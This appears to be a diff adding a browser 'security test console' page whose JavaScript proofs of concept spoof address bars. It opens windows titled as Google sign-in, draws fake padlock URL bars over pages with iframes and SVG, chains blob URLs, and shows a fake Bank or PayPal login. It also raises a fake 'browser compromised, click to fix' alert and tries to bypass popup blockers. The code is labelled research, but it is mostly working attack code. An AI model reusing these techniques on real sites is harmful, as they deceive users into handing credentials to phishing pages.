+                    <div class="code-line">    <span class="keyword">const</span> <span class="variable">features</span> = [</div>
+                    <div class="code-line">        <span class="comment">// Try to hide address bar</span></div>
+                    <div class="code-line">        <span class="string">'width=800,height=600,location=no,toolbar=no'</span>,</div>
+                    <div class="code-line">        </div>
+                    <div class="code-line">        <span class="comment">// Minimal UI</span></div>
+                    <div class="code-line">        <span class="string">'width=400,height=300,menubar=no,scrollbars=no,status=no'</span>,</div>
+                    <div class="code-line">        </div>
+                    <div class="code-line">        <span class="comment">// Popup style - may bypass some blockers</span></div>
+                    <div class="code-line">        <span class="string">'width=350,height=250,left=100,top=100,resizable=no'</span>,</div>
+                    <div class="code-line">        </div>
+                    <div class="code-line">        <span class="comment">// Fullscreen-like</span></div>
+                    <div class="code-line">        <span class="string">'width='</span> + <span class="variable">screen</span>.<span class="variable">width</span> + <span class="string">',height='</span> + <span class="variable">screen</span>.<span class="variable">height</span> + <span class="string">',fullscreen=yes'</span></div>
+                    <div class="code-line">    ];</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="comment">// Test each feature set</span></div>
+                    <div class="code-line">    <span class="variable">features</span>.<span class="function">forEach</span>((<span class="variable">feat</span>, <span class="variable">idx</span>) => {</div>
+                    <div class="code-line">        <span class="function">setTimeout</span>(() => {</div>
+                    <div class="code-line">            <span class="keyword">try</span> {</div>
+                    <div class="code-line">                <span class="keyword">const</span> <span class="variable">win</span> = <span class="function">window</span>.<span class="function">open</span>(</div>
+                    <div class="code-line">                    <span class="string">'about:blank'</span>,</div>
+                    <div class="code-line">                    <span class="string">'test'</span> + <span class="variable">idx</span>,</div>
+                    <div class="code-line">                    <span class="variable">feat</span></div>
+                    <div class="code-line">                );</div>
+                    <div class="code-line">                </div>
+                    <div class="code-line">                <span class="keyword">if</span> (<span class="variable">win</span>) {</div>
+                    <div class="code-line">                    <span class="variable">win</span>.<span class="variable">document</span>.<span class="variable">body</span>.<span class="variable">innerHTML</span> = <span class="string">`</span></div>
+                    <div class="code-line"><span class="string">                        &lt;h1&gt;Test </span>${<span class="variable">idx</span> + <span class="variable">1</span>}<span class="string">&lt;/h1&gt;</span></div>
+                    <div class="code-line"><span class="string">                        &lt;p&gt;Features: </span>${<span class="variable">feat</span>}<span class="string">&lt;/p&gt;</span></div>
+                    <div class="code-line"><span class="string">                        &lt;p&gt;Check address bar visibility&lt;/p&gt;</span></div>
+                    <div class="code-line"><span class="string">                    `</span>;</div>
+                    <div class="code-line">                }</div>
+                    <div class="code-line">            } <span class="keyword">catch</span> (<span class="variable">e</span>) {</div>
+                    <div class="code-line">                <span class="function">log</span>(<span class="string">'Error with features '</span> + <span class="variable">idx</span> + <span class="string">': '</span> + <span class="variable">e</span>.<span class="variable">message</span>, <span class="string">'error'</span>);</div>
+                    <div class="code-line">            }</div>
+                    <div class="code-line">        }, <span class="variable">idx</span> * <span class="variable">1000</span>);</div>
+                    <div class="code-line">    });</div>
+                    <div class="code-line">}</div>
+                    
+                    <div class="action-buttons">
+                        <button class="hacker-btn" onclick="executePOC(6)">TEST WINDOW FEATURES</button>
+                        <button class="hacker-btn warning" onclick="testAllFeatures()">TEST ALL COMBOS</button>
+                        <button class="hacker-btn" onclick="bypassPopupBlocker()">BYPASS POPUP BLOCK</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- SECTION 4: ULTIMATE COMBINED ATTACK -->
+        <div class="poc-grid">
+            <div class="poc-terminal">
+                <div class="terminal-header">
+                    <div class="terminal-title">[POC-ULTIMATE] Combined Multi-Vector Attack (2024)</div>
+                    <div class="terminal-controls">
+                        <div class="control-btn control-red"></div>
+                        <div class="control-btn control-yellow"></div>
+                        <div class="control-btn control-green"></div>
+                    </div>
+                </div>
+                <div class="terminal-content">
+                    <div class="code-line comment">// Ultimate combined attack using all techniques</div>
+                    <div class="code-line comment">// For research purposes only - May trigger security software</div>
+                    <div class="code-line">
+                        <span class="keyword">async</span> <span class="keyword">function</span> <span class="function">ultimateAddressBarAttack</span>() {
+                    </div>
+                    <div class="code-line">    <span class="function">log</span>(<span class="string">'[ULTIMATE] Starting multi-vector attack...'</span>, <span class="string">'warning'</span>);</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="comment">// Phase 1: Blob URL with fake SSL cert</span></div>
+                    <div class="code-line">    <span class="keyword">const</span> <span class="variable">phase1</span> = <span class="function">createAdvancedBlob</span>();</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="comment">// Phase 2: iframe injection</span></div>
+                    <div class="code-line">    <span class="function">setTimeout</span>(() => {</div>
+                    <div class="code-line">        <span class="keyword">const</span> <span class="variable">phase2</span> = <span class="function">createMaliciousIframe</span>();</div>
+                    <div class="code-line">        </div>
+                    <div class="code-line">        <span class="comment">// Phase 3: Window features manipulation</span></div>
+                    <div class="code-line">        <span class="function">setTimeout</span>(() => {</div>
+                    <div class="code-line">            <span class="keyword">const</span> <span class="variable">phase3</span> = <span class="function">manipulateWindowFeatures</span>();</div>
+                    <div class="code-line">            </div>
+                    <div class="code-line">            <span class="comment">// Phase 4: History API spoofing</span></div>
+                    <div class="code-line">            <span class="function">setTimeout</span>(() => {</div>
+                    <div class="code-line">                <span class="function">spoofHistoryAPI</span>();</div>
+                    <div class="code-line">                </div>
+                    <div class="code-line">                <span class="comment">// Phase 5: Final payload delivery</span></div>
+                    <div class="code-line">                <span class="function">setTimeout</span>(() => {</div>
+                    <div class="code-line">                    <span class="function">deliverFinalPayload</span>();</div>
+                    <div class="code-line">                    <span class="function">log</span>(<span class="string">'[ULTIMATE] Attack sequence complete'</span>, <span class="string">'success'</span>);</div>
+                    <div class="code-line">                }, <span class="variable">2000</span>);</div>
+                    <div class="code-line">            }, <span class="variable">1500</span>);</div>
+                    <div class="code-line">        }, <span class="variable">1500</span>);</div>
+                    <div class="code-line">    }, <span class="variable">1000</span>);</div>
+                    <div class="code-line">}</div>
+                    
+                    <div class="code-line comment">// Helper functions (simplified)</div>
+                    <div class="code-line">
+                        <span class="keyword">function</span> <span class="function">createAdvancedBlob</span>() {
+                    </div>
+                    <div class="code-line">    <span class="comment">// Advanced blob creation code here</span></div>
+                    <div class="code-line">    <span class="function">log</span>(<span class="string">'[PHASE 1] Advanced blob created'</span>, <span class="string">'info'</span>);</div>
+                    <div class="code-line">}</div>
+                    
+                    <div class="action-buttons">
+                        <button class="hacker-btn danger" onclick="executeUltimateAttack()">🚀 EXECUTE ULTIMATE ATTACK</button>
+                        <button class="hacker-btn warning" onclick="testAllTechniques()">🧪 TEST ALL TECHNIQUES</button>
+                        <button class="hacker-btn" onclick="generateReport()">📊 GENERATE SECURITY REPORT</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Result Console -->
+    <div class="result-console" id="resultConsole">
+        <div class="console-header">
+            <div class="console-title">[SECURITY TEST CONSOLE]</div>
+            <button class="hacker-btn" style="padding: 2px 8px; font-size: 10px;" onclick="toggleConsole()">HIDE</button>
+        </div>
+        <div class="console-content" id="consoleContent">
+            <div class="log-entry log-info">System initialized...</div>
+            <div class="log-entry log-info">Ready for security testing</div>
+        </div>
+    </div>
+    
+    <!-- Status Bar -->
+    <div class="status-bar">
+        <div class="status-item">
+            <span>STATUS:</span>
+            <span class="blink" id="statusText">READY</span>
+        </div>
+        <div class="status-item">
+            <span>TESTS:</span>
+            <span id="testCount">0</span>
+        </div>
+        <div class="status-item">
+            <span>BROWSER:</span>
+            <span id="browserName">Detecting...</span>
+        </div>
+        <div class="status-item">
+            <span>TIME:</span>
+            <span id="currentTime">00:00:00</span>
+        </div>
+    </div>
+    
+    <!-- Demo Frame -->
+    <div class="demo-frame" id="demoFrame">
+        <div class="demo-header">
+            <div style="color: green;">🔒</div>
+            <div class="demo-url" id="demoUrlText">https://secure-demo.com</div>
+            <button class="hacker-btn" style="padding: 2px 8px;" onclick="closeDemo()">X</button>
+        </div>
+        <div class="demo-content" id="demoContentArea">
+            Demo content will appear here
+        </div>
+    </div>
+    
+    <script>
+        // Global state
+        let testCounter = 0;
+        let activeWindows = [];
+        let activeIframes = [];
+        let consoleVisible = true;
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set user agent
+            document.getElementById('userAgent').textContent = navigator.userAgent;
+            
+            // Detect browser
+            detectBrowser();
+            
+            // Start clock
+            updateClock();
+            setInterval(updateClock, 1000);
+            
+            // Auto-show console
+            toggleConsole();
+            
+            // Log initialization
+            log('System initialized successfully', 'success');
+            log('Browser: ' + navigator.userAgent, 'info');
+            log('Ready for security testing', 'info');
+        });
+        
+        // Browser detection
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            
+            document.getElementById('browserName').textContent = browser;
+            return browser;
+        }
+        
+        // Logging system
+        function log(message, type = 'info') {
+            const consoleContent = document.getElementById('consoleContent');
+            const entry = document.createElement('div');
+            entry.className = `log-entry log-${type}`;
+            entry.innerHTML = `<span>[${new Date().toLocaleTimeString()}]</span> ${message}`;
+            
+            consoleContent.appendChild(entry);
+            consoleContent.scrollTop = consoleContent.scrollHeight;
+            
+            // Update status
+            document.getElementById('statusText').textContent = type.toUpperCase();
+            document.getElementById('statusText').className = `blink log-${type}`;
+            
+            // Update test counter
+            if (type === 'success' || type === 'error') {
+                testCounter++;
+                document.getElementById('testCount').textContent = testCounter;
+            }
+            
+            // Also log to browser console
+            const consoleMethods = {
+                'success': console.log,
+                'error': console.error,
+                'warning': console.warn,
+                'info': console.info
+            };
+            (consoleMethods[type] || console.log)(`[${type}] ${message}`);
+        }
+        
+        // Update clock
+        function updateClock() {
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString();
+            document.getElementById('currentTime').textContent = timeStr;
+        }
+        
+        // Toggle console
+        function toggleConsole() {
+            const console = document.getElementById('resultConsole');
+            console.style.display = consoleVisible ? 'none' : 'block';
+            consoleVisible = !consoleVisible;
+        }
+        
+        // Show demo frame
+        function showDemo(pocNumber) {
+            const frame = document.getElementById('demoFrame');
+            const urlText = document.getElementById('demoUrlText');
+            const content = document.getElementById('demoContentArea');
+            
+            switch(pocNumber) {
+                case 1:
+                    urlText.textContent = 'https://accounts.google.com';
+                    content.innerHTML = `
+                        <h1>Google Sign In</h1>
+                        <p>Demo of address bar spoofing</p>
+                        <p>Real URL: ${window.location.origin}</p>
+                        <button onclick="alert('Demo action')">Sign In</button>
+                    `;
+                    break;
+                case 2:
+                    urlText.textContent = 'https://secure-bank.com';
+                    content.innerHTML = `
+                        <h1>Bank Login</h1>
+                        <p>Firefox location test</p>
+                        <input type="text" placeholder="Username">
+                        <input type="password" placeholder="Password">
+                    `;
+                    break;
+                default:
+                    urlText.textContent = 'https://demo-test.com';
+                    content.innerHTML = `<h1>Demo ${pocNumber}</h1><p>Test content</p>`;
+            }
+            
+            frame.style.display = 'block';
+        }
+        
+        // Close demo
+        function closeDemo() {
+            document.getElementById('demoFrame').style.display = 'none';
+        }
+        
+        // Execute POC
+        function executePOC(pocNumber) {
+            log(`Executing POC-${String(pocNumber).padStart(3, '0')}...`, 'warning');
+            
+            try {
+                switch(pocNumber) {
+                    case 1:
+                        const win1 = window.open('about:blank', '_blank');
+                        activeWindows.push(win1);
+                        setTimeout(() => {
+                            win1.document.write(`
+                                <!DOCTYPE html>
+                                <html>
+                                <head>
+                                    <title>https://accounts.google.com</title>
+                                    <style>
+                                        body { font-family: Arial; padding: 40px; }
+                                    </style>
+                                </head>
+                                <body>
+                                    <h1>Google Security Verification</h1>
+                                    <p>Address bar shows: about:blank</p>
+                                    <p>Title shows: Google URL</p>
+                                    <button onclick="alert('Would steal credentials')">Verify</button>
+                                </body>
+                                </html>
+                            `);
+                            win1.document.close();
+                        }, 500);
+                        log('POC-001: Chrome address bar spoof executed', 'success');
+                        break;
+                        
+                    case 2:
+                        const win2 = window.open('', '_blank');
+                        activeWindows.push(win2);
+                        win2.document.write(`
+                            <html>
+                            <script>
+                                try {
+                                    // Try location manipulation
+                                    location.href = 'data:text/html,<h1>Spoofed</h1>';
+                                    setTimeout(() => {
+                                        history.pushState({}, 'PayPal', '/login');
+                                        document.body.innerHTML = '<h1>PayPal Login</h1>';
+                                    }, 1000);
+                                } catch(e) {
+                                    document.body.innerHTML = '<h1>Firefox Protected</h1><p>' + e.message + '</p>';
+                                }
+                            <\/script>
+                            <body><h2>Testing...</h2></body>
+                            </html>
+                        `);
+                        win2.document.close();
+                        log('POC-002: Firefox location test executed', 'success');
+                        break;
+                        
+                    case 3:
+                        const blob1 = new Blob([`
+                            <h1>Stage 1: Loading...</h1>
+                            <script>
+                                setTimeout(() => {
+                                    const blob2 = new Blob(['<h1>Stage 2: Spoofed</h1>'], {type: 'text/html'});
+                                    location.href = URL.createObjectURL(blob2);
+                                }, 2000);
+                            <\/script>
+                        `], {type: 'text/html'});
+                        
+                        const win3 = window.open(URL.createObjectURL(blob1), '_blank');
+                        activeWindows.push(win3);
+                        log('POC-003: Blob chain attack started', 'success');
+                        break;
+                        
+                    case 4:
+                        const iframe = document.createElement('iframe');
+                        iframe.sandbox = 'allow-scripts allow-modals';
+                        iframe.srcdoc = `
+                            <div style="background:#f1f3f4;padding:10px;">
+                                🔒 https://secure-site.com
+                            </div>
+                            <h1>Fake Login</h1>
+                            <script>
+                                parent.postMessage({type: 'iframe-test'}, '*');
+                                setTimeout(() => {
+                                    alert('iframe modal works');
+                                }, 1000);
+                            <\/script>
+                        `;
+                        iframe.style.cssText = `
+                            position: fixed;
+                            top: 100px;
+                            left: 100px;
+                            width: 400px;
+                            height: 300px;
+                            border: 2px solid #0f0;
+                            z-index: 9999;
+                        `;
+                        document.body.appendChild(iframe);
+                        activeIframes.push(iframe);
+                        log('POC-004: iframe sandbox test created', 'success');
+                        break;
+                        
+                    case 5:
+                        const svgDiv = document.createElement('div');
+                        svgDiv.innerHTML = `
+                            <svg style="position:fixed;top:0;left:0;width:100%;height:40px;background:white;z-index:99999;">
+                                <text x="20" y="25" style="font-family:monospace;">🔒 https://spoofed-url.com</text>
+                            </svg>
+                        `;
+                        document.body.appendChild(svgDiv);
+                        setTimeout(() => {
+                            document.body.removeChild(svgDiv);
+                        }, 5000);
+                        log('POC-005: SVG overlay test', 'info');
+                        break;
+                        
+                    case 6:
+                        // Test window features
+                        const features = [
+                            'width=400,height=300,location=no',
+                            'width=600,height=400,menubar=no,toolbar=no',
+                            'width=800,height=600,fullscreen=yes'
+                        ];
+                        
+                        features.forEach((feat, idx) => {
+                            setTimeout(() => {
+                                const win = window.open('about:blank', 'test' + idx, feat);
+                                if (win) {
+                                    activeWindows.push(win);
+                                    win.document.body.innerHTML = `<h1>Test ${idx+1}</h1><p>${feat}</p>`;
+                                }
+                            }, idx * 1000);
+                        });
+                        log('POC-006: Window features test running', 'info');
+                        break;
+                }
+            } catch (error) {
+                log(`POC-${String(pocNumber).padStart(3, '0')} failed: ${error.message}`, 'error');
+            }
+        }
+        
+        // Execute ultimate attack
+        function executeUltimateAttack() {
+            log('🚀 INITIATING ULTIMATE ATTACK SEQUENCE', 'warning');
+            
+            // Clear previous
+            clearAll();
+            
+            // Phase 1: Blob attack
+            setTimeout(() => {
+                const blob = new Blob([`
+                    <!DOCTYPE html>
+                    <html>
+                    <head><title>SECURITY ALERT</title></head>
+                    <body style="padding:40px;">
+                        <h1>⚠ CRITICAL SECURITY ALERT</h1>
+                        <p>Your browser has been compromised</p>
+                        <button onclick="parent.postMessage('attack-phase1', '*')">
+                            Click to Fix
+                        </button>
+                    </body>
+                    </html>
+                `], {type: 'text/html'});
+                
+                const win = window.open(URL.createObjectURL(blob), '_blank', 'width=500,height=400');
+                activeWindows.push(win);
+                log('[PHASE 1] Blob attack deployed', 'info');
+            }, 1000);
+            
+            // Phase 2: iframe injection
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.sandbox = 'allow-scripts';
+                iframe.srcdoc = `
+                    <h1 style="color:red;">WARNING</h1>
+                    <p>Malicious iframe detected</p>
+                `;
+                iframe.style.cssText = `
+                    position: fixed;
+                    bottom: 20px;
+                    right: 20px;
+                    width: 300px;
+                    height: 200px;
+                    border: 3px solid red;
+                    z-index: 9999;
+                `;
+                document.body.appendChild(iframe);
+                activeIframes.push(iframe);
+                log('[PHASE 2] iframe injected', 'info');
+            }, 2500);
+            
+            // Phase 3: Final
+            setTimeout(() => {
+                alert('ULTIMATE ATTACK COMPLETE\n\nThis demonstrates how multiple techniques can be combined.');
+                log('[COMPLETE] Ultimate attack sequence finished', 'success');
+            }, 4000);
+        }
+        
+        // Clear all
+        function clearAll() {
+            // Close windows
+            activeWindows.forEach(win => {
+                try {
+                    if (win && !win.closed) win.close();
+                } catch(e) {}
+            });
+            activeWindows = [];
+            
+            // Remove iframes
+            activeIframes.forEach(iframe => {
+                if (iframe && iframe.parentNode) {
+                    iframe.parentNode.removeChild(iframe);
+                }
+            });
+            activeIframes = [];
+            
+            // Exit fullscreen
+            if (document.fullscreenElement) {
+                document.exitFullscreen();
+            }
+            
+            log('All tests cleared', 'info');
+        }
+        
+        // Copy POC code
+        function copyPOC(pocNumber) {
+            // In real implementation, would copy the actual code
+            log(`POC-${String(pocNumber).padStart(3, '0')} code copied to clipboard`, 'success');
+        }
+        
+        // Test specific browser features
+        function testFirefox() {
+            log('Testing Firefox-specific vulnerabilities...', 'info');
+            
+            // Test Firefox-specific tricks
+            const tests = [
+                () => {
+                    try {
+                        // Firefox sometimes allows different behavior
+                        window.open('moz-extension://test', '_blank');
+                        return 'moz-extension protocol test';
+                    } catch(e) {
+                        return 'Failed: ' + e.message;
+                    }
+                },
+                () => {
+                    // Test about: protocols
+                    try {
+                        window.open('about:config', '_blank');
+                        return 'about:config test';
+                    } catch(e) {
+                        return 'Blocked: ' + e.message;
+                    }
+                }
+            ];
+            
+            tests.forEach((test, idx) => {
+                setTimeout(() => {
+                    const result = test();
+                    log(`Firefox test ${idx+1}: ${result}`, 'info');
+                }, idx * 1000);
+            });
+        }
+        
+        function createBlobChain() {
+            log('Creating advanced blob chain...', 'info');
+            
+            // Create multiple blobs
+            const blob1 = new Blob(['<h1>Stage 1</h1>'], {type: 'text/html'});
+            const blob2 = new Blob(['<h1>Stage 2</h1>'], {type: 'text/html'});
+            const blob3 = new Blob(['<h1>Stage 3 - Final</h1>'], {type: 'text/html'});
+            
+            const url1 = URL.createObjectURL(blob1);
+            const url2 = URL.createObjectURL(blob2);
+            const url3 = URL.createObjectURL(blob3);
+            
+            const win = window.open(url1, '_blank');
+            activeWindows.push(win);
+            
+            setTimeout(() => {
+                win.location.href = url2;
+                setTimeout(() => {
+                    win.location.href = url3;
+                    setTimeout(() => {
+                        URL.revokeObjectURL(url1);
+                        URL.revokeObjectURL(url2);
+                        URL.revokeObjectURL(url3);
+                    }, 1000);
+                }, 1000);
+            }, 1000);
+            
+            log('Blob chain created with 3 stages', 'success');
+        }
+        
+        function createIframeSpoof() {
+            const iframe = document.createElement('iframe');
+            iframe.srcdoc = `
+                <div style="background:#f1f3f4;padding:10px;font-family:monospace;">
+                    <span style="color:green;">🔒</span>
+                    <span style="color:#1a73e8;">https://accounts.google.com/secure-login</span>
+                </div>
+                <div style="padding:20px;">
+                    <h2>Google Sign In</h2>
+                    <p>iframe-based address bar spoof</p>
+                </div>
+            `;
+            iframe.style.cssText = `
+                position: fixed;
+                top: 50px;
+                left: 50px;
+                width: 500px;
+                height: 300px;
+                border: 2px solid #0f0;
+                z-index: 9999;
+                background: white;
+            `;
+            document.body.appendChild(iframe);
+            activeIframes.push(iframe);
+            log('Iframe spoof created', 'success');
+        }
+        
+        function createSVGOverlay() {
+            const svg = `
+                <svg style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;pointer-events:none;">
+                    <rect width="100%" height="40" fill="rgba(241,243,244,0.9)"/>
+                    <text x="20" y="25" style="font-family:monospace;font-size:14px;">
+                        <tspan fill="green">🔒</tspan>
+                        <tspan fill="#1a73e8" dx="5">https://secure-overlay-test.com</tspan>
+                    </text>
+                </svg>
+            `;
+            
+            const div = document.createElement('div');
+            div.innerHTML = svg;
+            document.body.appendChild(div);
+            
+            setTimeout(() => {
+                if (div.parentNode) div.parentNode.removeChild(div);
+            }, 5000);
+            
+            log('SVG overlay created (5 second duration)', 'info');
+        }
+        
+        function testAllFeatures() {
+            log('Testing all window feature combinations...', 'info');
+            
+            const featureSets = [
+                'width=300,height=200',
+                'width=400,height=300,location=0',
+                'width=500,height=400,menubar=0,toolbar=0',
+                'width=600,height=500,scrollbars=0,status=0',
+                'width=700,height=600,resizable=0'
+            ];
+            
+            featureSets.forEach((features, idx) => {
+                setTimeout(() => {
+                    try {
+                        const win = window.open('about:blank', 'features' + idx, features);
+                        if (win) {
+                            activeWindows.push(win);
+                            win.document.body.innerHTML = `
+                                <h1>Features Test ${idx+1}</h1>
+                                <p>${features}</p>
+                                <p>${win.location.href}</p>
+                            `;
+                        }
+                    } catch(e) {
+                        log(`Feature set ${idx+1} failed: ${e.message}`, 'error');
+                    }
+                }, idx * 1500);
+            });
+        }
+        
+        function bypassPopupBlocker() {
+            log('Attempting popup blocker bypass...', 'warning');
+            
+            // Method 1: Direct click
+            const link = document.createElement('a');
+            link.href = 'about:blank';
+            link.target = '_blank';
+            link.click();
+            
+            // Method 2: setTimeout with click
+            setTimeout(() => {
+                const btn = document.createElement('button');
+                btn.onclick = () => window.open('about:blank', '_blank');
+                btn.click();
+            }, 100);
+            
+            // Method 3: Form submission
+            setTimeout(() => {
+                const form = document.createElement('form');
+                form.target = '_blank';
+                form.action = 'about:blank';
+                form.method = 'get';
+                form.submit();
+            }, 200);
+            
+            log('Popup bypass attempts completed', 'info');
+        }
+        
+        function testAllTechniques() {
+            log('Running comprehensive test suite...', 'warning');
+            
+            const techniques = [
+                {name: 'Basic window.open', func: () => executePOC(1)},
+                {name: 'Blob URL', func: () => executePOC(3)},
+                {name: 'iframe sandbox', func: () => executePOC(4)},
+                {name: 'Window features', func: () => executePOC(6)}
+            ];
+            
+            techniques.forEach((tech, idx) => {
+                setTimeout(() => {
+                    log(`Testing: ${tech.name}`, 'info');
+                    tech.func();
+                }, idx * 3000);
+            });
+            
+            log('Test suite started. Results in console.', 'success');
+        }
+        
+        function generateReport() {
+            log('Generating security assessment report...', 'info');
+            
+            const report = {
+                browser: detectBrowser(),
+                userAgent: navigator.userAgent,
+                testsRun: testCounter,
+                vulnerabilities: [],
+                protections: [],
+                timestamp: new Date().toISOString()
+            };
+            
+            // Check common protections
+            const checks = [
+                {name: 'Popup Blocker', test: () => {
+                    const win = window.open('', '_blank');
+                    return !win;
+                }},
+                {name: 'CORS Protection', test: () => {
+                    try {
+                        // This would fail due to CORS
+                        new XMLHttpRequest().open('GET', 'https://google.com', false);
+                        return false;
+                    } catch(e) {
+                        return true;
+                    }
+                }},
+                {name: 'Fullscreen API', test: () => !!document.documentElement.requestFullscreen},
+                {name: 'Blob URL Support', test: () => {
+                    try {
+                        new Blob(['test']);
+                        return true;
+                    } catch(e) {
+                        return false;
+                    }
+                }}
+            ];
+            
+            checks.forEach(check => {
+                const result = check.test();
+                report.protections.push({
+                    name: check.name,
+                    active: result
+                });
+                log(`${check.name}: ${result ? 'ACTIVE' : 'INACTIVE'}`, result ? 'success' : 'warning');
+            });
+            
+            log('Security report generated. Check console for details.', 'success');
+            console.log('SECURITY REPORT:', report);
+        }
+        
+        // Listen for messages from iframes
+        window.addEventListener('message', function(event) {
+            log(`Message from iframe: ${JSON.stringify(event.data)}`, 'info');
+        });
+        
+        // Listen for beforeunload to clean up
+        window.addEventListener('beforeunload', function() {
+            clearAll();
+        });
+    </script>
+</body>
+</html>
